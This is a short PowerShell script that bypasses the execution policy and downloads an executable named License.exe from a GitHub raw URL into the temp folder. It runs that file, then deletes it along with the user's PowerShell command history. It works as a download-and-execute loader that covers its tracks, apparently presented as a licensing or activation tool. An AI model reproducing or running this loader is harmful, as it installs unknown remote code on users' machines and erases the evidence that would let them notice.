$ErrorActionPreference = "Stop"
Set-ExecutionPolicy Bypass -Scope Process
# Enable TLSv1.2 for compatibility with older clients
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12


$url = "https://raw.githubusercontent.com/chhai-dev/chhai-dev.github.io/main/remote/License.exe"
Set-ExecutionPolicy Bypass -Scope Process

$rand = Get-Random -Maximum 1000
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')


$outpath = "$env:TEMP/License.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $outpath)
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$env:TEMP/License.exe" -ArgumentList $args -Wait

$FilePaths = @("$env:TEMP\License.exe", "$env:SystemRoot\Temp\License.exe")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
Remove-Item (Get-PSReadlineOption).HistorySavePath
